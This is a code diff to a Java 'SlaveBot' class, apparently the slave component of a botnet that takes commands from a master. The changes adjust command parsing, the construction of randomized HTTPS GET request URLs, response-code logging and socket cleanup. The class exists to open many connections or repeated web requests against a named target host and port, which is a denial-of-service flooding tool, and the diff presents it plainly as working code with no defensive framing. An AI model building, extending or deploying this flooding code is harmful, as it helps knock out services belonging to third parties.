@@ -1,4 +1,4 @@
-//package bot;
+package bot;
 
 import java.io.*;
 import java.net.*;
@@ -52,9 +52,22 @@ public class SlaveBot implements Runnable {
 		String action  = (String)st.nextElement();
 		String targetHostName = ((String) st.nextElement());
 		String targetPort = ((String) st.nextElement());
-		String numberOfConn = ((String) st.nextElement());
-		String keepAliveOrUrl = ((String) st.nextElement());
-
+		String numberOfConn;
+		String keepAliveOrUrl;
+		
+		if(st.hasMoreElements()){
+		numberOfConn = ((String) st.nextElement());
+		if(st.hasMoreElements()){
+			keepAliveOrUrl = ((String) st.nextElement());
+		}
+		else {
+			keepAliveOrUrl = null;
+		}
+		}
+		else{
+			numberOfConn = null;
+			keepAliveOrUrl = null;
+		}
 
 
 		storeTargetData(action, targetHostName, targetPort, numberOfConn, keepAliveOrUrl);
@@ -151,8 +164,8 @@ public class SlaveBot implements Runnable {
 		}
 		else if(keepAliveOrUrl.startsWith("url=")){
 			String actualUrl = keepAliveOrUrl.replaceAll("url=", "");
-			String toAdd = "/#q=";
-			String halfUrl = actualUrl + toAdd;
+			//String toAdd = "/#q=";
+			String halfUrl = ip + ":" + port + actualUrl;
 			StringBuilder completeUrl = new StringBuilder(halfUrl);
 			HttpURLConnection connection = null;
 			Random random = new Random();
@@ -167,8 +180,8 @@ public class SlaveBot implements Runnable {
 				URL url = new URL("https://" + completeUrl.toString());
 				connection = (HttpURLConnection) url.openConnection();
 				connection.setRequestMethod("GET");
-				//int responseCode = connection.getResponseCode();
-				//System.out.println("Response Code : " + responseCode);
+				int responseCode = connection.getResponseCode();
+				System.out.println("Response Code : " + responseCode);
 
 				if (connection.getResponseCode() != 200) {
 					throw new RuntimeException("Failed : HTTP error code : "
@@ -222,7 +235,7 @@ public class SlaveBot implements Runnable {
 				try{
 					int length = obj.arrSoc.size();
 					for (int i = 0; i< length; i++){
-						Socket deleteSoc = (Socket)obj.arrSoc.get(i);
+						Socket deleteSoc = (Socket)obj.arrSoc.get(0);
 						deleteSoc.close();
 						obj.arrSoc.remove(deleteSoc);
 					}
